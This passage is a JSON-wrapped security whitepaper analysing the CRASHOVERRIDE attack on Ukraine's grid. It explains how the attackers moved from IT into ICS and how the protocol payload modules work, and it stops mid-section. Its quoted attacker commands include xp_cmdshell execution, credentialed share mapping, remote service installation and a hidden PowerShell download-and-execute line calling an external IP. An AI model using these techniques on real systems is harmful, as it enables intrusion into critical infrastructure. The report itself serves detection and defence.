{
    "id": "5613bf4e-c356-4ba9-a9ed-7e065a9cfea5",
    "created_at": "2022-10-25T16:48:17.519098Z",
    "updated_at": "2025-03-27T02:17:05.60579Z",
    "deleted_at": null,
    "sha1_hash": "a25ec7842d099723e923b84475074c8f75894a7b",
    "title": "Microsoft Word - CRASHOVERRIDE_Dragos_Website_FINAL.docx",
    "authors": "",
    "file_creation_date": "2018-10-12T18:38:38Z",
    "file_modification_date": "2018-10-12T18:38:38Z",
    "file_size": 1552715,
    "plain_text": "# Anatomy of an Attack: Detecting and\n Defeating CRASHOVERRIDE\n\n##### By Joe Slowik\n\n\n## Executive Summary\n\nCRASHOVERRIDE[1] is the first publicly-known malware designed to impact electric grid operations. While\nsome attention has already been paid to CRASHOVERRIDE’s ICS-specific effects, the broader scope of the\nattack – and the necessary prerequisites to its execution – have been woefully unexamined. Reviewing\npreviously unavailable data covering log, forensics, and various incident data, this paper will outline the\nCRASHOVERIDE attack in its entirety, from breach of the ICS network through delivery and execution of\nICS-specific payloads. This examination will show that, aside from the requirement to develop and deploy\nICS-targeting software for final effects, CRASHOVERRIDE largely relied upon fairly standard intrusion\ntechniques in order to achieve its results. By understanding this methodology and how these techniques\ncan be monitored and detected, ICS asset owners and defenders can begin identifying detection and\nvisibility gaps to catch such techniques in the future. While CRASHOVERRIDE represents an effectively\nnew application of malware to produce a physical impact, the underlying techniques for intrusion and\ndeployment would be immediately recognizable to a junior penetration tester. In demystifying this attack,\ndefenders and testers can gain greater appreciation for both the existing vulnerabilities within electric grid\noperations and the steps required to build effective defenses.\n\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\nMontreal, Quebec, Canada on October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/.\n\n1 ESET publicly disclosed CRASHOVERRIDE as “Industroyer” (https://www.welivesecurity.com/wpcontent/uploads/2017/06/Win32_Industroyer.pdf) in June 2017. In disclosing independent research and analysis\non this malware, Dragos used a different name as ESET selected “Industroyer” because of a belief that the malware\ncould be used to impact any industrial process. Dragos’ analysis indicates this is not the case, and that\nCRASHOVERRIDE instead is narrowly focused on electric distribution operations. While ESET’s technical analysis is\notherwise accurate, the implications behind the “Industroyer” name are misleading and incorrect.\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\n\n\n-----\n\n## Contents\n\nExecutive Summary ............................................................................................................................................. 1\n\nBackground .......................................................................................................................................................... 3\n\nAdversary ............................................................................................................................................................. 4\n\nInitial Intrusion ..................................................................................................................................................... 4\n\nPivoting to ICS ..................................................................................................................................................... 5\n\nMovement within ICS .......................................................................................................................................... 5\n\nCRASHOVERRIDE................................................................................................................................................. 8\n\nCRASHOVERRIDE Modules ..........................................................................................................................10\n\nLauncher Module ......................................................................................................................................10\n\nBrief Review of Grid Operations Protocols .............................................................................................11\n\nIEC-101 ......................................................................................................................................................11\n\nIEC-104 ......................................................................................................................................................12\n\nIEC-61850 .................................................................................................................................................12\n\nOPC ............................................................................................................................................................13\n\nHybrid Payload: OPC + 61850 .................................................................................................................14\n\nWiper Module ............................................................................................................................................15\n\nPrimary Backdoor Module ............................................................................................................................16\n\nImpeding Recovery .......................................................................................................................................16\n\nAlternate Backdoor .......................................................................................................................................17\n\nContext and Mitigation ......................................................................................................................................18\n\nAPPENDICES ......................................................................................................................................................20\n\nAPPENDIX A – List of Sample Hashes ........................................................................................................20\n\nAPPENDIX B – Remote Execution and Survey Script ................................................................................22\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n2\n\n\n-----\n\n## Background\n\n##### CRASHOVERRIDE itself is a modular malware framework designed to deploy several ICS protocol-specific attack payloads to disrupt electricity distribution.\n\n\n_Figure 1: ICS Malware Events_\n\n\nCRASHOVERRIDE was the second publicly-known ICS-targeting malware at the time of its discovery, and\nthe first to target the electric grid. (Figure 1) While previous operations took place against electric grid\noperations – most notably the 2015 Ukraine outage attributed to SANDWORM – none used malware to\ndeliver semi-autonomously the actual ICS impact. Initial public reporting focused on CRASHOVERRIDE’s\nimpact to energy grid operations, which included a relatively brief blackout in a specific Kiev substation in\nlate December 2016. While concerning, CRASHOVERRIDE’s ultimate, direct effects were rather\nunimpressive considering the underlying possibilities of the malware in question. Much more concerning\nthan the immediate impact was the implicit messaging behind the attack: that adversaries were now able\nand willing to invest time and resources to develop software specifically designed to manipulate electric\ngrid operations.\n\nCRASHOVERRIDE itself is a modular malware framework designed to deploy several ICS protocol-specific\nattack payloads to disrupt electricity distribution. Given this function, CRASHOVERRIDE must be deployed\non an endpoint within the target network capable of directly manipulating or communicating with ICS\ncontrolling equipment. Furthermore, CRASHOVERRIDE will only function if supplied with the appropriate,\nprotocol-specific communication module for the equipment in the victim environment.\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n3\n\n\n-----\n\nCRASHOVERRIDE’s implementation and execution is certainly\ninteresting, but the attack itself represents the final action in a complex,\nmulti-staged attack sequence. Paying inordinate attention to\nCRASHOVERRIDE’s final attack sequence ignores multiple stages prior\nto effect delivery where this assault could have been detected, stopped,\nor mitigated.\n\nWhile an understanding of CRASHOVERRIDE’s fundamentals is\nimportant and will be addressed in this paper, CRASHOVERRIDE is best\nunderstood as an event with multiple, inter-dependent stages. As shown\nin the ICS Cyber Kill Chain (Figure 2), the actual implementation of the\nCRASHOVERRIDE malware represents the final stage in a complex\noperation. Understanding how these individual, dependent actions work\nwith each other enables us to form a better understanding of\nCRASHOVERRIDE as an attack, starting with initial intrusion into the IT\nnetwork through execution of an ICS-disruptive payload. By taking this\n\n_Figure 2: ICS Cyber Kill Chain_ approach, ICS owners and operators can identify multiple potential\n\npoints to detect, mitigate, and defeat a CRASHOVERRIDE-like attack\nbefore reaching the final stages of the ICS Cyber Kill Chain.\n\n\n## Adversary\n\nFollowing analysis of CRASHOVERRIDE in mid-2017, researchers at Dragos\nidentified strong links between the entity executing the CRASHOVERRIDE\nattack and the SANDWORM APT actor responsible for the 2015 Ukraine\noutage.[2] Subsequent investigation and analysis of confidential information\nindicated the group responsible for CRASHOVERRIDE, ELECTRUM, may\nhave previously served as the ICS capability development team for\nSANDWORM, and possibly executed greater operational autonomy with\nrespect to 2016 events in Kiev. (Figure 3) When referring to the adversary\nexecuting the CRASHOVERRIDE attack this paper will default to ELECTRUM.\n\nBased on association with SANDWORM, ELECTRUM aligns with Russian\nstrategic interests and is assessed to be a capable, well-resourced\nadversary. While many aspects of ELECTRUM activity remain uncertain,\navailable information indicates the group possesses specialized\ndevelopment capabilities for ICS-specific software and remains\noperationally active.\n\n## Initial Intrusion\n\n\n_Figure 3: ELECTRUM Activity_\n\n_Group_\n\n\nInitial infection vectors are often very difficult to identify post-incident when viewing information gleaned\nthrough external research. Based on available evidence and subsequent information in this paper, we can\nidentify the initial intrusion to the target environment as possibly emerging from a phishing campaign as\n\n2 “Confirmation of a Coordinated Attack on the Ukrainian Power Grid” – SANS Institute\n(https://ics.sans.org/blog/2016/01/09/confirmation-of-a-coordinated-attack-on-the-ukrainian-power-grid#)\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n4\n\n\n-----\n\nearly as January 2016.[3] This earliest possible date places events in Ukraine almost a year prior to the\nCRASHOVERRIDE impact, and mere weeks following the 2015 Ukrainian power event. Based on analysis\nof additional recovered artifacts, initial access and entrenchment in the IT network was achieved no later\nthan October 2016.\n\n## Pivoting to ICS\n\n##### From recovered log and system data, the adversary initially accessed a device in early December that was either dual-homed on the IT and ICS networks or featured connectivity to the IT network.\n\nSpecific information on how ELECTRUM navigated from IT to ICS – a critical inflection point for ICS\nintrusion events – remains elusive. Based on information presented in the next section, ELECTRUM most\nlikely leveraged credential capture on compromised IT machines to build up a corpus of logons and\nadditional authentication information. From this step, and similar in some respects to the 2015 Ukrainian\npower outage, ELECTRUM would reuse legitimate credentials to remotely log on to machines within the\nICS environment or leverage existing VPN connections.\n\nFrom recovered log and system data, the adversary initially accessed a device in early December that was\neither dual-homed on the IT and ICS networks or featured connectivity to the IT network. This compromise\npre-dated any other interactions with hosts in the ICS environment. Given this timeline information and\ninitial activity focusing on user account manipulation in early December, ELECTRUM appears to have used\nthis device as its “beach head” within the ICS network.\n\nStarting on 01 December 2016 at 0128 (unspecified time zone in recovered log data), rapid user account\nmodifications take place on this initial ICS access server focused on two newly-created accounts, “admin”\nand “система” (System). The accounts are created, assigned to a domain matching local operations, and\nprivileges delegated before event logging on the impacted system is disabled at 0129. The speed of the\nabove operations implies at minimum adversary scripting to make multiple changes within a short span\nof time.\n\n## Movement within ICS\n\n##### ELECTRUM used a variety of native system commands, known utilities, and custom scripts from the core server hosts.\n\nELECTRUM activity then appears to slow within the network, until a significant and rapid resumption of\noperations on 12 December 2016. At this point, a new host appears in records. Based on captured artifacts\nand logs, the device is a Microsoft Windows Server 2003 device running Microsoft SQL Server. Subsequent\ninvestigation indicated two additional, similar devices in the environment also accessed by the attacker\nthat featured the same naming schema (e.g., “Device-1”, “Device-2”, etc.). Within an ICS environment a\ndatabase server can serve as a type of data historian for process and control system information.[4] In this\nrole, the devices would be expected to have extensive connections to other hosts within the network –\n\n3 “New Wave of Cyberattacks Against Ukrainian Power Industry” – ESET\n(https://www.welivesecurity.com/2016/01/20/new-wave-attacks-ukrainian-power-industry/)\n\n4 “Control System Historian” – ICS-CERT (https://ics-cert.us-cert.gov/Control_System_Historian-Definition.html)\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n5\n\n\n-----\n\nincluding devices either directly involved in critical process operations, or devices directly connected to\nsuch hosts.\n\nThe first signs of interaction occur at approximately 1300 on 12 December 2016 with several actions that\nappear to be initial reconnaissance. For example, ELECTRUM begins querying directory info, performing\ndirectory listings, and testing network connectivity. These actions continue for approximately two hours,\nincluding network connectivity checks to other resources in the victim environment by name. This\nsuggests the attacker has already performed sufficient reconnaissance of the ICS environment to identify\nhosts of interest. Unfortunately, corresponding log data was not available to provide definitive evidence\nfor this assumption.\n\nELECTRUM then executes a script to test authentication capability to a series of named hosts within the\ncontrol system network. While the original script was not recovered, in logging data a series of rapid RPC\nauthentication attempts were observed to multiple hosts for user “Administrator” with the same password\nacross over 100 endpoints, specified by host name. The combination of credential specificity and hostname identification strongly indicates significant reconnaissance activity between initial access to the\nICS environment in early December and the observed activity in mid-December.\n\nIn both this activity and other survey, reconnaissance, and execution items, nearly all commands across\nall three server hosts are executed in the following manner:\n\n```\nEXEC xp_cmdshell <command>\n\n```\n\nThe above format cements the theory of the server hosts being MS-SQL servers, as “xp_cmdshell” is a\nMS-SQL command that allows for execution of arbitrary commands.[5] From this, ELECTRUM appears to\nleverage MS-SQL access to the central “pivot” machines to gain code execution throughout the ICS\nenvironment. By identifying a means to both occupy a strategic, central node for the victim network and\nan effective but not easy to identify method for command execution, ELECTRUM placed itself in an\nexcellent position to broaden the scope of the compromise.\n\nIn addition to the above, ELECTRUM also attempted to create a link between servers.[6] While the exact\ndestination server was not recovered in data, the following command is observed:\n```\n   \"BEGIN EXEC master.dbo.sp_addlinkedserver @server = N'\" & strLink & \"',\n   @srvproduct=N'SQL Server'; EXEC master.dbo.sp_addlinkedsrvlogin\n   @rmtsrvname=N'\" & strLink &\n   \"',@useself=N'False',@rmtuser=N'admin',@rmtpassword='<PASSWORD>'; END;\"\n\n```\n5 “xp_cmdshell” – Microsoft (https://docs.microsoft.com/en-us/sql/relational-databases/system-storedprocedures/xp-cmdshell-transact-sql?view=sql-server-2017)\n\n6 “Create Linked Servers” – Microsoft (https://docs.microsoft.com/en-us/sql/relational-databases/linkedservers/create-linked-servers-sql-server-database-engine?view=sql-server-2017)\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n6\n\n\n-----\n\nELECTRUM used a variety of native system commands, known utilities, and custom scripts from the core\nserver hosts. With the exception of a UPX-packed copy of Mimikatz,[7] no actual malware aside from the\nfinal CRASHOVERRIDE payload is observed in available data. Examples of commands executed include\nthe following:\n```\n   EXEC xp_cmdshell 'net use L: \\\\<TargetIP>\\$C <Password>\n   /USER:<Domain>\\<User>';\n   EXEC xp_cmdshell 'move C:\\Delta\\m32.txt C:\\Delta\\m32.exe';\n   EXEC xp_cmdshell 'netstat -an';\n\n```\nThe “move” command example is interesting, as it reflects behavior seen in multiple instances where\nELECTRUM transferred files into the ICS network as “.txt” extensions. After moving the relevant files to\nvictims in the ICS environment, these files were renamed as “.exe” items using the move command prior\nto further operations. While simple and not especially elegant, such a technique can be used to defeat very\nsimple detection methodologies based on extension tracking.\n\nAdditionally, scripts and the SysInternals PSExec program are used for additional functions. Of note on\nPSExec, ELECTRUM renamed the executable “ps.exe” and used an older version than the latest available\nat the time of the attack. While PSExec 2.2, published July 2016, would be the most-recent version,\nELECTRUM instead utilized version 2.11, published April 2014.[8]\n\nFrom a script perspective, multiple VBS and BAT scripts were used in the event to facilitate file movement,\nsystem survey, and as a wrapper for PowerShell execution. For example, one lengthy script, “remote.vbs”,\nprovides the ability to remotely query another system when given an IP, user name, and password. The\nscript itself, provided in Appendix B, is essentially a collection of benign WMI and similar queries to\nperform system survey information and command execution. Looking at the source code, there are\noverlaps with multiple publicly-available examples for running WMI queries but no exact matches.\nExamples of script use for remote process execution include the following:\n```\n   EXEC xp_cmdshell 'cscript C:\\Delta\\remote.vbs /s:<TargetIP> /u:<UserName>\n   /p:<Password> /t:-r arp -a'\n   EXEC xp_cmdshell 'cscript C:\\Delta\\remote.vbs /s:<TargetIP> /u:<UserName>\n   /p:<Password> /t:-r dir C:\\intel\\';\n\n```\nA different example is a simple BAT script used to execute PowerShell:\n```\n   powershell.exe -nop -w hidden -c $l=new-object\n   net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Crede\n   ntials=[Net.CredentialCache]::DefaultCredentials;IEX\n   $l.downloadstring('hxxp://188[.]42[.]253[.]43:8801/msupdate');\n\n```\n7 Hashes for all recovered samples and malware are found in Appendix A.\n\n8 PSExec – Microsoft Sysinternals (https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n7\n\n\n-----\n\nAside from being proxy-aware, the above is a simple, unobfuscated PowerShell script to retrieve a file.\nUnfortunately, at the time of discovery the resource specified was no longer available, so its exact function\nand purpose are unknown.\n\nFueling much if not most of this activity was the ability to capture and reuse legitimate network credentials\nwithin the victim environment. As stated previously, the adversary used Mimikatz for this purpose. Most\ninterestingly for the assumed level of attack sophistication and the wide variety of options for obfuscating\nMimikatz or running it within memory, ELECTRUM simply compiled the publicly-available Mimikatz source\ncode and packed it with UPX. While the tool itself remains effective, from a detection and mitigation\nstandpoint this choice is very curious.\n\nTying all of the above together, ELECTRUM leveraged a combination of scripts, remote process execution,\nand credential harvesting to penetrate the environment and “seed” it with a final, malicious payload:\nCRASHOVERRIDE.\n\n## CRASHOVERRIDE\n\n##### ELECTRUM creates and starts CRASHOVERRIDE as a system service.\n\nAfter extensive environmental survey activity and verifying access in the 12 to 15 December 2016 time\nperiod, ELECTRUM proceeds to push the CRASHOVERRIDE framework to target hosts around 16\nDecember 2016. After verifying connectivity and other operations, on 17 December ELECTRUM begins\npushing out malicious software to hosts connected to the server machines using a BAT file calling two,\nunrecovered VBS scripts. Although the exact content of the VBS items is unknown, review of the BAT\nindicates they copy files to remote hosts and then verify via a directory listing. Of note, the BAT contains\nhard-coded addresses and separate files exist for each of the CRASHOVERRIDE payload modules EXCEPT\nthe “launcher” module. Example lines from “101_copy.bat” and “104_copy.bat” include the following:\n```\n   cscript C:\\Backinfo\\ufn.vbs <TargetIP> \"C:\\Backinfo\\ImapiService.exe\"\n   \"C:\\Delta\\svchost.exe\"\n   cscript C:\\Backinfo\\ufn.vbs <TargetIP> \"C:\\Backinfo\\101.dll\"\n   \"C:\\Delta\\101.dll\"\n   cscript C:\\Backinfo\\ufn.vbs <TargetIP> \"C:\\Backinfo\\139.ini\"\n   \"C:\\Delta\\101.ini\"\n   cscript C:\\Backinfo\\ufn.vbs <TargetIP> \"C:\\Backinfo\\haslo.dat\"\n   \"C:\\Delta\\haslo.dat\"\n   cscript C:\\Backinfo\\sqlc.vbs \"<TargetIP>\" \"-c\" \"dir C:\\Delta\\\"\n   cscript C:\\Backinfo\\ufn.vbs <TargetIP> \"C:\\Backinfo\\ImapiService.exe\"\n   \"C:\\Delta\\svchost.exe\"\n   cscript C:\\Backinfo\\ufn.vbs <TargetIP> \"C:\\Backinfo\\104.dll\"\n   \"C:\\Delta\\104.dll\"\n   cscript C:\\Backinfo\\ufn.vbs <TargetIP> \"C:\\Backinfo\\140.ini\"\n   \"C:\\Delta\\104.ini\"\n   cscript C:\\Backinfo\\ufn.vbs <TargetIP> \"C:\\Backinfo\\haslo.dat\"\n   \"C:\\Delta\\haslo.dat\"\n   cscript C:\\Backinfo\\sqlc.vbs \"<TargetIP>\" \"-c\" \"dir C:\\Delta\\\"\n\n```\nReview of the individual modules will follow below. At a high level, CRASHOVERRIDE itself consists of at\nleast three pieces (and in most cases, four): a launcher executable; an ICS protocol-specific payload\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n8\n\n\n-----\n\nmodule in DLL form; a wiper payload module, also in DLL form; and a configuration file for most of the\neffects payloads.\n\nOf note, the above scripts do _not include copying of the CRASHOVERRIDE launcher module. Artifacts_\nrelating to this event were not available but given past observed activity likely options for moving this\nmodule to target devices would be the NET USE command or similar activity. The most likely reason for\nseparating these actions is target specificity: while the CRASHOVERRIDE launcher module is common\nacross all attack types, specific payload modules are required for different target devices. By copying the\n“core” component first along with other operations, ELECTRUM could conduct appropriate surveillance to\ndetermine what ICS targets link to victim hosts, and thus select the appropriate ICS effects payload\nmodule for deployment.\n\nOnce copied over, ELECTRUM creates and starts CRASHOVERRIDE as a system service in all observed\ncases except in the standalone OPC module. ELECTRUM uses the “remote.vbs” script, described above,\nto call “sc config” and related commands to start services on remote systems. For example:\n```\n   EXEC xp_cmdshell 'cscript C:\\Delta\\remote.vbs /s:<TargetIP>\n   /u:<Host/Domain>\\<User> /p:<Password> /t:-c sc config imapiservice binPath=\n   \"C:\\Intel\\imapi.exe C:\\Intel\\ imapi.dll i.ini\" start= auto';\n\n```\nSeparate commands are issued to start the service, which will also start on system boot. The “binPath”\nsetting indicates the calling convention for CRASHOVERRIDE:\n\n```\nCoreExecutable WorkingDirectory PayloadModule ConfigurationFile\n\n```\n\nWhile the service is manually started and set to\nauto-start on boot, actual execution will wait due to\na timing function within the binary set to a hardcoded value. The specific coding routine is shown\nin Figure 4 and works to set a “trigger event” for\nactual payload execution and to coordinate\nexecution across multiple installations or victim\nhosts.\n\nOne item of immediate interest in analyzing\navailable data: ELECTRUM actions copying\nCRASHOVERRIDE payloads to hosts and executing\nthem as services did not rely on a reported custom\n\nbackdoor identified in the attack.[9] While this\n\n_Figure 4: Launcher Timing Function_\n\nbackdoor software was recovered from\ncompromised hosts and existed within the environment, all identified data from recovered log and\n\n\n9 See ESET’s “WIN32/Industroyer: A New Threat for Industrial Control Systems”, section “Main Backdoor”\n(https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf)\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n9\n\n\n-----\n\nforensics information indicates that native system commands combined with credential reuse were used\nto deploy and execute ICS impact packages – with no indications of custom malware used (or needed) to\nproduce this effect. While it is possible that evidence exists for the custom backdoor use outside of what\nwas available for this analysis, a review of operations indicates such malware was completely\nunnecessary to achieve the desired effect.\n\nBefore proceeding with further information on the attack, a review of the specific CRASHOVERRIDE\ncomponents is necessary.\n\n### CRASHOVERRIDE Modules\n\nCRASHOVERRIDE is a modular framework\nconsisting of multiple, dependent parts. Displayed\nin Figure 5, The “launcher” module serves as the\nbase for subsequent operations and provides the\nframework for subsequent effects modules to\nexecute. Each effects module is specially\npurposed for either a specific ICS communication\nprotocol or the general “wiping” module. Overall\nfunctionality for an ICS attack entails the launcher\nmodule calling the exported “Crash” function from\na payload DLL specified when launched, using a\nconfiguration file to determine targets (depending\non payload), and then automatically calling the\nwiper component – also a DLL exporting “Crash”\n– after a cool-down period.\n\n#### Launcher Module\n\nAll recovered launcher modules feature\nrelatively simplistic functionality. At a high level, _Figure 5: CRASHOVERRIDE Program Flow_\nthey are designed as service executables that\ncall the “Crash” export for the provided DLL based on the calling parameters documented previously. Of\ninterest, analyzed launcher samples contain several hardcoded parameters, including service name for\nthe created service (examples include “defragsvc” and “imapiservice”) and execution times for payload\nafter service start. Examples of execution times identified include:\n\n```\n   December 17, 2016 22:27 UTC\n   December 20, 2016 06:30 UTC\n\n```\nAfter reaching the hard-coded time value, the service hands off execution to the relevant payload or\neffects DLL to begin producing the intended ICS impact. Two hours after initial attack execution, the\nLauncher then moves execution to the destructive or “wiper” module, detailed below.\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n10\n\n\n-----\n\n#### Brief Review of Grid Operations Protocols\n\nElectric distribution operations leverage\nsupervisory control and data acquisition\n(SCADA) systems to manage grid\noperations across geographically\ndistributed areas. Facilitating this activity\nare specific protocols designed to\ncommunicate with equipment from\ncentralized operations centers. Protocols\nare often vendor- or region-specific. For\nexample, IEC-101 and IEC-104, both used\nin CRASHOVERRIDE, are generally used\nonly in Europe and parts of the Middle East\nand Asia. North American operations\ntypically rely on Distributed Network\nProtocol 3 (DNP3) for the same\nfunctionality. While all provide the same\nbase-level capabilities, their\nimplementations are obviously somewhat\ndifferent, meaning that ICS\ncommunications must be designed for the\n\n_Figure 6: CRASHOVERRIDE Protocols in Context_\n\nspecific grid operations implementation at\nplay. Figure 6 provides an overview of how various protocols “flow” through a simplistic grid operations\nnetwork design, highlighting the four protocols used in CRASHOVERRIDE: IEC-101, IEC-104, IEC-61850,\nand OPC DA. Additional information on grid operations and functionality can be found in the Dragos\nCRASHOVERRIDE whitepaper.[10]\n\n\n#### IEC-101\n\nIEC-101 is a grid operations protocol mostly found in Europe as well as parts of Asia and the Middle East.\nUnlike the rest of the protocols leveraged in CRASHOVERRIDE, IEC-101 uses serial communications –\ninstead of TCP/IP – to control and communicate with equipment. The IEC-101 DLL – in all recovered\ncases creatively named “101.dll” – requires a configuration file specifying Information Object Address\n(IOA) values. Ultimately, the module is simply designed to change the state of IOAs to switch physical\nbreaker status from closed to open, or vice versa.\n\n10 “CRASHOVERRIDE: Analysis of the Threat to Electric Grid Operations” – Dragos\n(https://dragos.com/blog/crashoverride/)\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n11\n\n\n-----\n\n#### IEC-104\n\nIEC-104 is in many respects the same as IEC-101, except\ncommunications take place over TCP/IP. As a result, the\nconfiguration file for IEC-104 payloads requires a target\nIP address, with the attack package focused on the same\nopen/closed effect as seen in IEC-101. Shown in Figure\n7, the IEC-104 module execution flow is quite\nstraightforward: the launcher calls the exported “Crash”\nfunction from the IEC-104 DLL; a client thread is created;\ndepending on configuration a new communication\nprocess is started or an existing IEC-104\ncommunications process is replaced; a socket is formed\nto controlled devices to begin sending traffic; traffic is\nrecorded to a log file. Once this routine is complete,\nexecution is handed back to the launcher to await the\ncountdown triggering the destructive module.\n\n#### IEC-61850\n\nIEC-61850 is a standard for substation\ncommunications with a global footprint, and\nwith development efforts contributed by ABB.[11]\nAs such, this protocol features a much broader\nadoption than IEC-101 and IEC-104 and is more\nconcerning for operators globally given this\nlarger usage footprint.\n\nWithin recovered data, two versions of the IEC61850 attack module were recovered: an EXE\nspecifying a configuration file, and a DLL using\nthe same “Crash” export functionality as other\nrecovered samples. An examination of the\n“WinMain” routine for the EXE (Figure 8) and the\n“Crash” export for the DLL (Figure 9) show\ninitialization to be essentially the same as\nprevious modules, with the exception of the\nEXE’s specification of a configuration file, “i.ini”,\nlocated in the same directory. As a result, the\nEXE can be run as a stand-alone executable with\nno parameters aside from presence of a\nconfiguration file (all options are hard-coded),\n\n\n_Figure 9: CRASH Export_\n\n\n11 IEC 61850: What You Need to Know About Functionality and Practical Implementation – Schweitzer Engineering\nLaboratories (https://selinc.com/api/download/3671/) and IEC 61850 Power Utility Automation – ABB\n(https://new.abb.com/substation-automation/systems/iec-61850)\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n12\n\n\n-----\n\nwhile the DLL requires the launcher with parameters specified.\n\nWhile a configuration file is specified – simply containing a list of IP addresses, one per line – both types\nalso have functionality to dynamically perform network discovery. This is performed by first enumerating\nall network adapters on the victim machine, then enumerating all connected IPs to the network interfaces.\nBased on the network address and broadcast address for connected IPs, the module then attempts to\nconnect to _every IP in the subnet via broadcast address. Each successful connection is stored in an_\ninternal array matching the format of “i.ini”. While effective, this routine represents a very blunt (and\nexceptionally noisy) mechanism for indiscriminately identifying other hosts within the network.\n\nActual communications to devices take place via TCP 102, the default listening port for this targeted\nversion of IEC-61850-compliant communication. In this context, it is important to note that actual\ncommunications leverage Manufacturing Message Specification (MMS), while IEC-61850 provides the\nstandard for addressing these messages within IEC-61850-1.[12] Based on this, the modules then gather\nand enumerate control points from devices corresponding to switches and breakers within the\nconfiguration file, with the ultimate goal of toggling designated control points following enumeration to\neither OPEN (0) or CLOSE (1) states. This provides effectively similar functionality – in terms of physical\nimpact – as the IEC-101 and -104 modules.\n\n#### OPC\n\nOLE for Process Control (OPC) and specifically the Data Access (DA) standard,[13] were targeted by\nCRASHOVERRIDE’s OPC-DA module. The standard is an OPC Foundation specification that “defines how\nreal-time data can be transferred between a data source and a data sink (for example: a PLC and an HMI)\nwithout either of them having to know each other’s native protocol.”[14] This module exists as a stand-alone\nexecutable. Examining available log and forensics data, the module is called via a remote execution\nroutine with no need for support files, making it distinct from other modules:\n```\n   EXEC xp_cmdshell 'cscript C:\\Delta\\remote.vbs /s:<TargetIP>\n   /u:<Host/Domain>\\<User> /p:<Password> /t:-r cmd /c start c:\\Intel\\opc.exe';\n\n```\nExamining the file supports the above conclusion. First, the module appears to reuse source code from a\npublicly-available OPC client toolkit.[15] Second, no configuration file is necessary or referenced in the code,\nindicating that the binary should be able to perform some auto-discovery function. The module includes\nfunctionality for both local and remote enumeration of OPC server instances, but only local discovery is\ncalled. While default credentials appear to be hardcoded for remote access in the MakeRemoteHost\nfunction – user “Administrator” and password “1qas@WSX” – the specification still requires a hostname\n\n12 RFC1006 – IETF (https://tools.ietf.org/html/rfc1006)\n\n13 OLE for Process Control Data Access Automation Interface Standard (https://wwwbd.fnal.gov/controls/opc/OPC_DA_Auto_2.02_Specification.pdf)\n\n14 OPC Data Access (OPC DA) Versions and Compatibility – Matrikon (https://www.matrikonopc.com/opcserver/opc-data-access-versions.aspx)\n\n15 See https://sourceforge.net/projects/opcclient/files/OPCClientToolKit/\n\n\n©2018 Dragos, Inc. All rights reserved. [Protected] Non-confidential content. October 12, 2018\nAnatomy of an Attack: Detecting and Defeating CRASHOVERRIDE originally presented at Virusbulletin\non October 4[th], 2018: https://www.virusbulletin.com/conference/vb2018/\n\n\n13\n\n\n-----\n\nfor the target device, which does not appear to be provided anywhere, and additionally the function is\nnever actually used.\n\nThe module is therefore limited to enumerating and interacting with local OPC server instances running\non the infected host. Thus, unlike the other CRASHOVERRIDE modules, the OPC module is designed to run\non the host providing ICS-related functionality and control, rather than sending messages “downstream”\nto another device.\n\nFrom an enumeration perspective, the program attempts to identify local items:\n\n  - ctlSelOn\n\n  - ctlSelOff\n\n  - ctlOperOn\n\n  - ctlOperOff\n\n  - stVal\n\nOnce this is complete, responding items are logged, then “ctlOperOn” and “ctlSelOn” are set (irrespective\nof their status during enumeration). Next, the module turns the same items off by setting “ctlOperOff” and\n“ctlSelOff.” This corresponds to opening breakers or turning a selected pathway “off”, brining functionality\nin line with previously-discussed modules.\n\n#### Hybrid 